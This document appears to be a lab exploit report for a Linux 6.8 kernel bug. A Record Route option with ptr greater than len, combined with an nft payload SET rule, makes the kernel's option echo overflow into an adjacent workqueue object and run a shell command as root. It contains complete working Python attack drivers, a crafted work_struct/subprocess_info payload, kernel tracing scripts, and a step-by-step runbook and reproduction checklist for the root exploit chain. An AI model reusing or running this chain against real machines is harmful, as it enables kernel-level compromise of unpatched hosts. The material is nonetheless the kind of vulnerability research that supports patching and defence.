# REPORT-02 — r1: nft Stage-1 writer → two-slot workqueue RCE

**Status:** host root demonstrated on `pwnescape-r1` (`192.168.122.211`),
boot 35, 2026-10-19 14:10Z, kernel `6.8.0-139-generic` (pre-fix).

**Model:** host-fixture. The `nft` writer, host RST/probe, listener, and
observers are host-side. The overflower SYN is guest-issued. This is not a
strict guest-only chain.

This route is the alternative when the target has `nft` but not
`xt_CHECKSUM`. The chain is the same two-slot workqueue overwrite, with the
nft payload `SET` replacing the checksum target.

---

## 1. Result

```
/tmp/pwned:
uid=0(root) gid=0(root) groups=0(root)
```

Dry/fire gate summary:

```
DRY  QUEUE work==X
     ACT work==X
     ECHORET ret=0 dstoptlen=64
     WCHK kmrel=2af name=rnd-15
     EXEC funclive=__x86_return_thunk
     EXECEND funccalled=__x86_return_thunk

FIRE QUEUE work==X'
     ACT work==X'
     ECHORET dstoptlen=224
     WCHK rnd-15
     EXEC funclive=call_usermodehelper_exec_work
     CB work==X'
     EXECEND funccalled=exec_work
```

`/tmp/pwned` was verified over SSH at 14:13Z; the boot was later lost to an
unrelated shared-KVM/network event at 14:15:47Z. The provenance is
transcript-consistent but **QUALIFIED**, not a fully independent reproduction.

---

## 2. Environment

| Item | Value |
|---|---|
| Victim host | L1 `pwnescape-r1`, `192.168.122.211` |
| Attacker | L2 `l2-attacker`, `192.168.250.114` |
| Kernel | `6.8.0-139-generic`, pre-fix |
| Boot | 35, cold boot 2026-10-19 13:36:18Z |
| Writer | `nft` table `ip m2`, chain `c`, hook `input priority mangle` |
| Listener | `0.0.0.0:7778` |
| Probe | IPv6 `fd01:0:<gw>::1` with `FAILED` neighbour, aged ~12 s |
| Observer | `r6obs` (CO-RE) + `r7_obs4.bt` (bpftrace) |
| CPU | vhost/sshd/listener and sender on CPU7 |

Setup is the same as [LAB-ENV.md](LAB-ENV.md), with the nft writer instead of
`xt_CHECKSUM`:

```bash
sudo nft add table ip m2
sudo nft 'add chain ip m2 c { type filter hook input priority mangle; }'
```

The per-attempt rule is installed by `r7_final4.py` **before** the RST/probe
sequence:

```bash
# dry: 64-byte echo
sudo nft add rule ip m2 c tcp dport 7778 tcp sport <ovsp> \
  @nh,168,8 set 0x40

# fire: 224-byte echo
sudo nft add rule ip m2 c tcp dport 7778 tcp sport <ovsp> \
  @nh,168,8 set 0xe0

# after the GO reply
sudo nft flush chain ip m2 c
```

`@nh,168,8` is bit 168 of the network header = **IPv4 byte 21** = the RR
length byte.

---

## 3. Source map

Line numbers refer to the local vanilla `linux-6.8` tree; use the function
names as the stable reference for Ubuntu `6.8.0-139`.

| Path | Function | Role |
|---|---|---|
| `net/netfilter/nft_payload.c:813` | `nft_payload_set_eval()` | `skb_store_bits()` writes the live option byte |
| `net/ipv4/ip_options.c:311` | `__ip_options_compile()` RR case | `ptr > len` bypasses the inner bounds check |
| `include/net/tcp.h:2402` | `tcp_v4_save_options()` | `kmalloc(32 + optlen)`; `optlen=4` -> 36 B -> kmalloc-64 |
| `net/ipv4/ip_options.c:77` | `__ip_options_echo()` | re-reads the live RR length; unbounded `memcpy` |
| `net/ipv4/ip_options.c:44` | `ip_options_build()` | copies the stored optlen into the SYN-ACK |
| `kernel/workqueue.c:2539` | `process_one_work()` | reads `work->data`/`work->func` and calls it |
| `kernel/umh.c:158` | `call_usermodehelper_exec_work()` | executes the fake `subprocess_info` |

### 3.1 nft write

`net/netfilter/nft_payload.c`:

```c
static void nft_payload_set_eval(const struct nft_expr *expr,
                                 struct nft_regs *regs,
                                 const struct nft_pktinfo *pkt)
{
    const struct nft_payload_set *priv = nft_expr_priv(expr);
    struct sk_buff *skb = pkt->skb;
    ...
    case NFT_PAYLOAD_NETWORK_HEADER:
        offset = skb_network_offset(skb);
        break;
    ...
    offset += priv->offset;

    ...
    if (skb_ensure_writable(skb, max(offset + priv->len, 0)) ||
        skb_store_bits(skb, offset, src, priv->len) < 0)
        goto err;
    ...
}
```

The rule writes 1 byte at network-header bit 168 = IPv4 byte 21. It runs in
the `input/mangle` hook, after `ip_options_compile()` and before
`tcp_v4_save_options()`.

### 3.2 RR `ptr > len`

`net/ipv4/ip_options.c`:

```c
case IPOPT_RR:
    if (opt->rr) {
        pp_ptr = optptr;
        goto error;
    }
    if (optlen < 3) {
        pp_ptr = optptr + 1;
        goto error;
    }
    if (optptr[2] < 4) {
        pp_ptr = optptr + 2;
        goto error;
    }
    if (optptr[2] <= optlen) {
        if (optptr[2]+3 > optlen) {
            pp_ptr = optptr + 2;
            goto error;
        }
        ...
    }
    opt->rr = optptr - iph;
```

The overflower uses RR `[7,4,5,0]`:

- `optlen = 4`;
- `ptr = 5`;
- `optptr[2] (5) <= optlen (4)` is false, so the inner `ptr+3 > optlen` check
  is skipped;
- the option compiles; `opt->optlen = 4`; `tcp_v4_save_options()` does
  `kmalloc(32 + 4) = 36` -> `kmalloc-64`.

If `ptr == len == 4`, the inner check runs (`4+3 > 4`) and
`ip_options_compile()` returns `-EINVAL`; `ip_rcv_options()` drops the packet
with `ICMP_PARAMETERPROB` before TCP. This exact failure killed an earlier dry.

### 3.3 Echo and build

`net/ipv4/ip_options.c`:

```c
int __ip_options_echo(struct net *net, struct ip_options *dopt,
                      struct sk_buff *skb, const struct ip_options *sopt)
{
    ...
    sptr = skb_network_header(skb);
    dptr = dopt->__data;

    if (sopt->rr) {
        optlen  = sptr[sopt->rr+1];      /* live length = nft SET value */
        soffset = sptr[sopt->rr+2];
        dopt->rr = dopt->optlen + sizeof(struct iphdr);
        memcpy(dptr, sptr+sopt->rr, optlen);
        ...
    }
    ...
}
```

`ip_options_build()` later copies the stored `opt->optlen` bytes:

```c
memcpy(iph + sizeof(struct iphdr), opt->__data, opt->optlen);
```

---

## 4. Geometry

### 4.1 Slab

```
[ O : victim dopt ][ X = O + 64 : rt6_probe_work ]
```

- `O` is the victim request's `ip_options_rcu` allocation; `tcp_v4_save_options`
  allocates `32 + 4 = 36` bytes -> `kmalloc-64`.
- `X` is `rt6_probe_work` (`work_struct` + `in6_addr` + `dev` = 56 B) ->
  `kmalloc-64`.
- Both must be in the same `kmalloc-rnd-XX-64` cache. On boot 35 the cache was
  `rnd-15`.

### 4.2 Overflower frame

`r8waiter.py` sends an IPv4 SYN with:

- `IHL = 6` (24-byte IP header, 4-byte option area);
- RR `[7,4,5,0]` at `IP+20`;
- correct IP/TCP checksums;
- 8 filler bytes + 192-byte work payload = 200 bytes.

Because `IHL=6`, the TCP header is at `IP+24` and the payload at `IP+44`.
The echo copy is:

```
memcpy(dopt+32, IP+20, len)
```

With `len=64` (dry) or `224` (fire), the mapping is:

```
payload[8 .. 39]  -> X+0  .. X+31     (dry work header)
payload[8 .. 199] -> X+0  .. X+191    (fire work + subprocess_info)
```

The 8-byte filler compensates for `IP+20` vs `IP+24` and the 20-byte TCP
header.

---

## 5. Chain

```
RST O                  # free the victim dopt
RST X                  # free the work slot
probe6(gw)             # rt6_probe work -> X; head = O
GO overflower           # dopt -> O; echo 64/224 B from O+32 -> X-32..
```

For the dry:

```
wire=0x4000 -> nft sets RR length 0x40 (64)
copy covers O+32 .. O+95 = X-32 .. X+31
func = __x86_return_thunk
```

For the fire:

```
wire=0xE000 -> nft sets RR length 0xE0 (224)
copy covers O+32 .. O+255 = X-32 .. X+191
func = call_usermodehelper_exec_work
```

The payload is the same shape as REPORT-01:

```text
X+0    work->data       = pwq | 5
X+8    work->entry.next = poolhead
X+16   work->entry.prev = poolhead
X+24   work->func       = kbase + 0x12ec10
X+32   complete = 0
X+40   path     = X + 128
X+48   argv     = X + 160
X+56   envp     = X + 184
X+64   wait     = 2
X+128  "/bin/sh"
X+136  "-c"
X+140  "id > /tmp/pwned"
```

---

## 6. Scripts

### 6.1 `scripts/r1/r7_final4.py` — host orchestrator

```python
#!/usr/bin/env python3
# r7_final4.py <Osp> <Oseq> <Xsp> <Xseq> <gw> <ovsp> <ovseq> <dry|fire>
# Two-slot chain, nft-payload-SET variant (xt_CHECKSUM replaced end-to-end).
# The nft table ip m2 / chain c (type filter hook input priority mangle) must
# exist; this driver adds the SPORT-CONDITIONED rule
#     tcp dport 7778 tcp sport <ovsp> @nh,168,8 set 0x40|0xE0
# BEFORE the chain (so no mid-sequence delay), and deletes it after.
# Sequence: nft-add -> RST O -> RST X -> host UDP probe (work at X, head=O) ->
# GON to the guest waiter (IHL=6 overflower via virtio; nft sets RR length) ->
# overflower dopt (36 B, kmalloc-64) pops O; echo copies 64/224 B from IP+20
# into O+32..; payload[8..] lands on X+0.. (work header / subprocess_info).
# Env: R7_X (absolute X), R7_PWQ, R7_PH.
import socket, struct, sys, os, time, subprocess

SRC4 = bytes([192, 168, 250, 114]); DST4 = bytes([192, 168, 250, 1])
GUEST = "192.168.250.114"
NFT_T = "ip"; NFT_C = "m2/c"

def csum(d):
    if len(d) % 2: d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d)//2), d))
    while s >> 16: s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def tcp_frame(sport, seq, flags=0x02):
    hl = 20; th = 20
    ip = bytearray(hl + th)
    ip[0] = 0x45
    struct.pack_into(">H", ip, 2, len(ip)); struct.pack_into(">H", ip, 4, 0x5757)
    ip[8] = 64; ip[9] = 6; ip[12:16] = SRC4; ip[16:20] = DST4
    t = memoryview(ip)[hl:]
    struct.pack_into(">HHII", t, 0, sport, 7778, seq & 0xffffffff, 0)
    t[12] = 0x50; t[13] = flags
    struct.pack_into(">H", t, 14, 0x4000 if flags & 0x02 else 0)
    pseudo = SRC4 + DST4 + b"\0" + bytes([6]) + struct.pack(">H", th)
    struct.pack_into(">H", t, 16, csum(pseudo + bytes(t[:th])))
    struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    return bytes(ip)

def ksym(n):
    for l in open("/proc/kallsyms"):
        p = l.split()
        if len(p) >= 3 and p[2] == n: return int(p[0], 16)
    return 0

def work_payload(X, pwq, ph, func, cmd):
    p = bytearray(192)
    struct.pack_into("<Q", p, 0, pwq | 5)
    struct.pack_into("<Q", p, 8, ph); struct.pack_into("<Q", p, 16, ph)
    struct.pack_into("<Q", p, 24, func)
    struct.pack_into("<Q", p, 40, X + 128); struct.pack_into("<Q", p, 48, X + 160)
    struct.pack_into("<Q", p, 56, X + 184); struct.pack_into("<I", p, 64, 2)
    p[128:136] = b"/bin/sh\0"; p[136:140] = b"-c\0\0"
    p[140:140 + len(cmd)] = cmd
    struct.pack_into("<4Q", p, 160, X + 128, X + 136, X + 140, 0)
    return bytes(p)

def nft(*args):
    return subprocess.run(["nft", *args], capture_output=True, text=True)

def main():
    osp = int(sys.argv[1]); oseq = int(sys.argv[2], 0)
    xsp = int(sys.argv[3]); xseq = int(sys.argv[4], 0)
    gw = int(sys.argv[5], 0); ovsp = int(sys.argv[6]); ovseq = int(sys.argv[7], 0)
    mode = sys.argv[8]
    X = int(os.environ["R7_X"], 0); pwq = int(os.environ["R7_PWQ"], 0)
    ph = int(os.environ["R7_PH"], 0)
    setval = "0x40" if mode == "dry" else "0xE0"
    func = ksym("__x86_return_thunk") if mode == "dry" else ksym("call_usermodehelper_exec_work")
    cmd = b"touch /tmp/r7dry\0" if mode == "dry" else b"id > /tmp/pwned\0"
    payload = work_payload(X, pwq, ph, func, cmd)
    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    u6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); u6.bind(("fd00:1::1", 0))
    go = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); go.connect((GUEST, 9999)); go.settimeout(0.6)
    t0 = time.time()
    # 0) nft rule (sport-conditioned so ONLY the overflower's RR length is set)
    # NB: table and chain must be SEPARATE tokens ("ip m2 c"); "ip m2/c" is a parse error.
    r = nft("add", "rule", "ip", "m2", "c", "tcp", "dport", "7778", "tcp", "sport",
            str(ovsp), "@nh,168,8", "set", setval)
    if r.returncode != 0:
        print("NFTADD-FAIL %s %s" % (r.stdout.strip()[:120], r.stderr.strip()[:200]))
        return 3
    # 1) RST O -> free O, then RST X -> free X (head)
    raw.sendto(tcp_frame(osp, oseq + 1, flags=0x04), ("192.168.250.1", 0))
    raw.sendto(tcp_frame(xsp, xseq + 1, flags=0x04), ("192.168.250.1", 0))
    # 2) host UDP probe -> work pops X, head=O
    try:
        u6.sendto(b"R7W", ("fd01:0:%x::1" % gw, 9))
    except OSError as e:
        print("UDPFAIL", e)
    # 3) GO: guest sends the IHL=6 overflower; nft sets its RR length at INPUT
    msg = ("GON %d %d %s" % (ovsp, ovseq, payload.hex())).encode()
    t1 = time.time()
    go.send(msg)
    try:
        rep = go.recv(64).decode()
    except Exception as e:
        rep = "NOREPLY %s" % e
    t2 = time.time()
    # dedicated chain: flush removes exactly our sport-conditioned rule
    nft("flush", "chain", "ip", "m2", "c")
    print("FIN4 mode=%s X=%#x func=%#x set=%s rsts=%.0fus go=%.0fus total=%.0fus reply=%s" %
          (mode, X, func, setval, (t1 - t0) * 1e6, (t2 - t1) * 1e6, (t2 - t0) * 1e6, rep))

main()
```

### 6.2 `scripts/r1/r8waiter.py` — guest overflower

```python
#!/usr/bin/env python3
# r8waiter.py -- guest-side nft overflower waiter (L2, root).
# Binds UDP 192.168.250.114:9999. On "GON <ovsp> <ovseq> <hexpayload>"
# sends the nft-flow overflower SYN through virtio-net: IHL=6 with a 4-byte
# RR option [7,4,4,0]. The host's nft INPUT rule (sport-conditioned) sets
# ip[21] (RR length) to 0x40 (dry) / 0xE0 (fire), so __ip_options_echo copies
# 64/224 bytes from IP+20 into dopt->__data (obj+32).
# Geometry (IHL=6): TCP header at IP+24, payload at IP+44;
#   copy obj+32+k <- IP+20+k  =>  payload[8..39]  -> X+0..31  (work header)
#                              =>  payload[8..199] -> X+0..191 (fire layout)
# The waiter sends 8 filler bytes + the 192-byte work payload (200 total).
# No vnet-csum games: the frame carries correct checksums; the nft rule does
# the mangle. Reply: "OK <us>".
import socket, struct, sys, time, signal
sys.path.insert(0, "/tmp")
import guest_exploit as ge

def _log_sig(s, f):
    try: open("/tmp/r8wait.log", "a").write("SIGNAL %d\n" % s)
    except Exception: pass
for _s in (signal.SIGHUP, signal.SIGTERM, signal.SIGINT, signal.SIGQUIT, signal.SIGPIPE):
    signal.signal(_s, _log_sig)

def csum16(d):
    if len(d) % 2: d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d)//2), d))
    while s >> 16: s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def overflower_frame(sport, seq, payload200):
    ihl = 24; thlen = 20
    ip = bytearray(ihl + thlen + len(payload200))
    ip[0] = 0x46                                  # v4, IHL=6 (4-byte option area)
    struct.pack_into(">H", ip, 2, len(ip)); struct.pack_into(">H", ip, 4, 0x4343)
    ip[8] = 64; ip[9] = 6
    ip[12:16] = ge.src4; ip[16:20] = ge.dst4
    ip[20:24] = bytes([7, 4, 5, 0])               # RR(len 4, ptr 5>len -> compile-valid), EOL pad
                                                 # (ptr==len fails ip_options_compile: ptr+3>len -> error -> drop)
                                                 # nft SET rewrites ip[21] to 0x40/0xE0 at INPUT.
    th = memoryview(ip)[ihl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq & 0xffffffff, 0)
    th[12] = 5 << 4; th[13] = 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    th[thlen:] = payload200
    pseudo = ge.src4 + ge.dst4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload200))
    struct.pack_into(">H", th, 16, csum16(pseudo + bytes(th[:thlen + len(payload200)])))
    struct.pack_into(">H", ip, 10, 0)
    struct.pack_into(">H", ip, 10, csum16(bytes(ip[:ihl])))
    eth = ge.macd + ge.macs + struct.pack(">H", 0x8100) + b"\0\0" \
        + struct.pack(">H", 0x8100) + b"\0\0" + struct.pack(">H", 0x0800)
    return bytes(10) + eth + bytes(ip)

def main():
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rx.bind(("0.0.0.0", 9999))
    tx = ge.sock()
    print("r8waiter ready (nft flow, IHL=6/4B RR)", flush=True)
    while True:
        data, addr = rx.recvfrom(65535)
        try:
            msg = data.decode(errors="replace").split()
            if not msg:
                continue
            if msg[0] == "PING":
                rx.sendto(b"PONG", addr)
                continue
            if msg[0] != "GON":
                continue
            ovsp = int(msg[1]); ovseq = int(msg[2], 0)
            work = bytes.fromhex(msg[3])            # 192-byte work payload
            payload200 = b"NFTSHIFT" + work         # 8 filler + 192 = 200; payload[8..39] -> X+0..31 (dry), [8..199] -> X+0..191 (fire)
            t0 = time.time()
            tx.send(overflower_frame(ovsp, ovseq, payload200))
            rx.sendto(("OK %.0f" % ((time.time() - t0) * 1e6)).encode(), addr)
        except Exception as e:
            try: rx.sendto(("ERR %s" % e).encode(), addr)
            except Exception: pass

main()
```

### 6.3 `scripts/r1/r7_obs4.bt` — evidence-strengthened observer

```bt
// r7_obs4.bt -- evidence-strengthened chain observer (dayburn additions; chain unchanged).
//
// Daybreak findings addressed:
//  W1: workqueue_queue_work fires BEFORE insert_work -> NOT a commit record.
//      -> QUEUE is kept only for pairing; the commit records are ACT (activate_work =
//         the active-list insert) and EXEC/EXECEND.
//  W2: workqueue_execute_start rereads LIVE work->func, but dispatch calls the earlier
//      worker->current_func snapshot (kernel/workqueue.c:2566 snapshot, :2633 call,
//      :2638 trace). -> EXEC prints the live reread; EXECEND prints the snapshot that
//      was ACTUALLY called (trace arg 'function' = worker->current_func).
//  W3: __ip_options_echo probe is external; name alone not trusted.
//      -> ECHO (kprobe entry) prints args; ECHORET (kretprobe RETURN) prints retval and
//         the DESTINATION state after the call: dst->optlen (the summed copy length:
//         64 for dry set 0x40, 224 for fire set 0xE0) and the first 8 bytes written to
//         dst->__data (= obj+32, the copy landing at O). This is the write-to-O commit.
//  W4: callback entry kprobe on call_usermodehelper_exec_work (fire). arg0 =
//      subprocess_info.work (offset 0, RANDSTRUCT_NONE) == X'. __x86_return_thunk
//      kprobe intentionally NOT added: it fires on every kernel return (unbounded rate),
//      would flood and perturb the us-scale chain; the dry's called-func proof is
//      EXECEND's snapshot == __x86_return_thunk.
//  Work identity (never ftrace entry->return cache pairing): WCHK = rt6_probe-gated
//  kmalloc_trace(size=56), cache from arg0 PER EVENT, kmrel from the entry stack
//  return address; cross-checked against QUEUE work address.
//
// struct ip_options (6.8, include/net/inet_sock.h): faddr+0 nexthop+4 optlen+8(1B)
// srr+9 rr+10 ts+11 flags+12 ... __data+16. ip_options_rcu: rcu(16)+opt -> arg1 = obj+16.
kprobe:__ip_options_echo {
  $skb = (struct sk_buff *)arg2;
  $sopt = (struct ip_options *)arg3;
  $th = (uint16 *)((uint64)$skb->head + $skb->transport_header);
  @edopt[tid] = arg1;
  @esport[tid] = bswap(*$th);
  printf("ECHO dopt=%lx soptlen=%u rr=%u sport=%u cpu=%d\n",
         arg1 - 16, $sopt->optlen, $sopt->rr, bswap(*$th), cpu);
}
kretprobe:__ip_options_echo /@edopt[tid] != 0/ {
  $d = @edopt[tid];
  printf("ECHORET sport=%u ret=%d dstoptlen=%u dstrr=%u data0=%lx\n",
         @esport[tid], (int32)retval, *(uint8 *)($d + 8), *(uint8 *)($d + 10),
         *(uint64 *)($d + 16));
  delete(@edopt[tid]); delete(@esport[tid]);
}
kprobe:rt6_probe { @rt[tid] = *(uint64 *)reg("sp"); }
kretprobe:rt6_probe { delete(@rt[tid]); }
kprobe:kmalloc_trace /@rt[tid] != 0 && arg2 == 56/ {
  @cache[tid] = arg0; @site[tid] = *(uint64 *)reg("sp"); @hit[tid] = 1;
}
kretprobe:kmalloc_trace /@hit[tid] == 1/ {
  printf("WCHK work=%lx cache=%lx kmrel=%lx cpu=%d name=%s\n",
         retval, @cache[tid], @site[tid] - kaddr("rt6_probe"), cpu,
         str(((struct kmem_cache *)@cache[tid])->name));
  @seen[retval] = 1;
  delete(@hit[tid]); delete(@cache[tid]); delete(@site[tid]);
}
tracepoint:workqueue:workqueue_queue_work {
  if (args->function == kaddr("rt6_probe_deferred")) {
    printf("QUEUE work=%lx funclive=%lx cpu=%d\n", args->work, args->function, args->cpu);
    @seen[(uint64)args->work] = 1;
  }
}
tracepoint:workqueue:workqueue_activate_work /@seen[(uint64)args->work] != 0/ {
  printf("ACT work=%lx cpu=%d\n", args->work, cpu);
}
tracepoint:workqueue:workqueue_execute_start /@seen[(uint64)args->work] != 0/ {
  $w = (uint64)args->work;
  printf("EXEC work=%lx funclive=%lx cpu=%d\n", $w, *(uint64 *)($w + 24), cpu);
}
tracepoint:workqueue:workqueue_execute_end /@seen[(uint64)args->work] != 0/ {
  printf("EXECEND work=%lx funccalled=%lx cpu=%d\n", args->work, args->function, cpu);
  delete(@seen[(uint64)args->work]);
}
kprobe:call_usermodehelper_exec_work {
  printf("CB work=%lx cpu=%d\n", arg0, cpu);
}
```

### 6.4 `scripts/r1/r7_guest.py` — victim primer

Full script: `scripts/r1/r7_guest.py`. The `prime` mode sends the victim
SYNs:

```python
def main():
    mode = sys.argv[1]
    if mode == "prime":
        n = int(sys.argv[2]); base = int(sys.argv[3])
        tx = ge.sock(); t0 = time.time()
        for i in range(n):
            tx.send(ip_frame(base+i, 0xE0000000+i, b"A"*64, None))
        print("PRIME n=%d base=%d dt=%.1fms" % (n, base, (time.time()-t0)*1e3))
        return 0
```

### 6.5 `scripts/r1/v12chain.sh` — full chain driver

Full script: `scripts/r1/v12chain.sh`. It performs:

1. config sanity (`RANDSTRUCT`, `LOCKDEP`);
2. starts `r7_obs4.bt` and `r6obs`;
3. starts the guest waiter held open by ssh;
4. learns `pwq`/`poolhead` with a probe;
5. primes 40 victims and picks two adjacent `O/X` pairs;
6. `spin_on` (kworkers `SCHED_IDLE`, CPU7 spinner);
7. runs dry with `nft set 0x40` and all six gates;
8. runs fire with `nft set 0xe0` and checks `/tmp/pwned`.

Key gate block:

```bash
if [ "$QW" = "${X0#0x}" ] && [ -n "$ACX" ] && [ "$ERO" = "0" ] \
   && [ "$ERL" = "64" ] && echo "$WK" | grep -q "kmalloc-rnd-15-64" \
   && echo "$EX" | grep -q "funclive=$RET" \
   && echo "$XE" | grep -q "funccalled=$RET"; then
  echo "=== DRY GATES PASS (all six) -> FIRE"
fi
```

### 6.6 Remote `synopt` dependency

`r7_guest.py` uses `/tmp/synopt` for some non-prime modes. The `prime` path
used by `v12chain.sh` is pure Python (`ip_frame` + `guest_exploit.sock()`), so
the essential chain does not need `synopt`.

---

## 7. Runbook

### 7.1 Prepare

```bash
# L1
sudo bash scripts/common/install.sh
sudo bash /opt/pwnescape/tools/r6veth_up.sh
sudo python3 /opt/pwnescape/tools/listen_on.py 7778 &
sudo nft add table ip m2
sudo nft 'add chain ip m2 c { type filter hook input priority mangle; }'
sudo ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad
sudo sysctl -qw net.ipv6.conf.virbr-pwn.router_probe_interval=10
sudo sysctl -qw net.ipv4.tcp_synack_retries=12
```

### 7.2 Gate

```bash
sudo bash /opt/pwnescape/tools/r7_gate2.sh
# ELIGIBLE iff dopt_live == workA (kmrel 2af) or workB (kmrel 1ec)
```

The observed 35-boot sample had `siteE == siteN` on every boot; the hit rate
was `1/35` (~`1/16`).

### 7.3 Deploy guest scripts

```bash
scp -i ~/.ssh/l2_key /opt/pwnescape/tools/r8waiter.py \
  /opt/pwnescape/tools/r7_guest.py \
  /opt/pwnescape/tools/guest_exploit.py \
  ubuntu@192.168.250.114:/tmp/
```

### 7.4 Run the full chain

```bash
sudo bash /opt/pwnescape/tools/v12chain.sh
```

The script starts the observer, waiter, prime, pick, dry, and fire. If any gate
fails, it aborts without fire.

### 7.5 Manual variant

```bash
# guest
sudo python3 /tmp/r8waiter.py

# host: prime and pick O/X
ssh guest 'sudo python3 /tmp/r7_guest.py prime 40 54800'
# parse the ECHO map and select O, X=O+64

# host: dry
R7_X=<X> R7_PWQ=<pwq> R7_PH=<poolhead> taskset -c 7 \
  python3 /opt/pwnescape/tools/r7_final4.py \
  <Osp> <Oseq> <Xsp> <Xseq> <gw> 46300 0x9d000001 dry

# host: fire only after dry PASS
R7_X=<X'> R7_PWQ=<pwq> R7_PH=<poolhead> taskset -c 7 \
  python3 /opt/pwnescape/tools/r7_final4.py \
  <Osp'> <Oseq'> <Xsp'> <Xseq'> <gw2> 46301 0x9d000002 fire
```

---

## 8. Gates and expected output

Dry:

```
QUEUE work == X
ACT work == X
ECHORET ret=0 dstoptlen=64
WCHK kmrel=2af name=rnd-15
EXEC funclive=__x86_return_thunk
EXECEND funccalled=__x86_return_thunk
```

Fire:

```
QUEUE work == X'
ACT work == X'
ECHORET dstoptlen=224
WCHK rnd-15
EXEC funclive=call_usermodehelper_exec_work
CB work == X'
EXECEND funccalled=exec_work
/tmp/pwned == uid=0(root)
```

Abort on any mismatch. Never send `0xFF00`.

---

## 9. Evidence

Evidence is **not bundled** in this package (removed by request). The result,
gate, and limitation summaries above are retained.

The provenance discussion is explicit: the root result, gates, clock
correlation, and deployed-copy reconciliation were auditable in the original
bundle, but five tool differences lacked a successful-run MD5 and the session
transcript was not bundled. Treat r1 as **transcript-consistent, provenance
QUALIFIED**.

---

## 10. Limitations

1. **Host-fixture.** nft writer, host RST/probe, listener, and observers are
   host-side.
2. **Observer payload.** `pwq`, `poolhead`, and KASLR came from CO-RE/bpftrace
   on this route; r6 is the observer-free-payload improvement.
3. **Boot lottery.** 35 boots, one hit; `siteE == siteN` on every boot.
4. **Provenance.** QUALIFIED, not fully independently reproducible.
5. **Boot 35 became unreachable** at 14:15:47Z after a shared L0/KVM event;
   the frozen boot could not be re-inspected live.
6. **`ptr == len` fails.** The overflower must use `ptr > len`; this is a
   compile-validity requirement, not a tuning choice.
7. **`r6obs` / `r7_obs4.bt` are required** for the gates and the payload
   values. The chain is not observer-free.
8. **Lab-specific literals.** The drivers use `192.168.250.114` (guest) and
   `192.168.250.1` (host), `enp1s0`, and MACs `52:54:00:07:c6:0b` /
   `52:54:00:b2:39:e6`. Update them for a rebuilt lab.

---

## 11. Reproduction checklist

- [ ] L1 kernel `6.8.0-139-generic`, pre-fix.
- [ ] nft table `ip m2`, chain `c` at `input/mangle`.
- [ ] listener `0.0.0.0:7778`.
- [ ] IPv6 `fd00:1::1/64`, failed neighbour route aged ~12 s.
- [ ] vhost/sshd/listener on CPU7; CPU7 kworkers `SCHED_IDLE`.
- [ ] `r6obs` and `r7_obs4.bt` running.
- [ ] guest waiter `r8waiter.py` answering `PING`/`PONG`.
- [ ] `r7_gate2.sh` reports ELIGIBLE.
- [ ] prime 40, pick two `O/X` pairs.
- [ ] dry all six gates PASS.
- [ ] fire all seven gates PASS and `/tmp/pwned` is root.
